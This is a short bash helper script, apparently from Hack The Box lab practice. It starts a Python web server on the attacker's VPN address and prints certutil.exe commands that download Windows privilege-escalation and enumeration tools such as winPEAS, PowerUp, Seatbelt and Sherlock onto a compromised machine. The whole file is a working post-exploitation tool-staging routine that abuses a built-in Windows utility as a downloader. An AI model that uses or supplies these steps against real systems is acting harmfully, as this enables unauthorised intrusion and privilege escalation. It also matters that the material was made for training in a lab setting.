#!/bin/bash

htbip=$(ip addr | grep tun0 | grep inet | grep 10. | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)

echo "You can download any of these tools using commands below:"
echo ""
echo "  certutil.exe -urlcache -split -f http://$htbip/accesschk.exe accesschk.exe"
echo "  certutil.exe -urlcache -split -f http://$htbip/winPEASany.exe winPEASany.exe"
echo "  certutil.exe -urlcache -split -f http://$htbip/Seatbelt.exe Seatbelt.exe"
echo "  certutil.exe -urlcache -split -f http://$htbip/SharpUp.exe SharpUp.exe"
echo "  certutil.exe -urlcache -split -f http://$htbip/Watson.exe Watson.exe"
echo "  certutil.exe -urlcache -split -f http://$htbip/PowerUp.exe PowerUp.exe"
echo "  certutil.exe -urlcache -split -f http://$htbip/Sherlock.exe Sherlock.exe"
echo "  certutil.exe -urlcache -split -f http://$htbip/jaws-enum.exe jaws-enum.exe"

sudo python3 -m http.server 80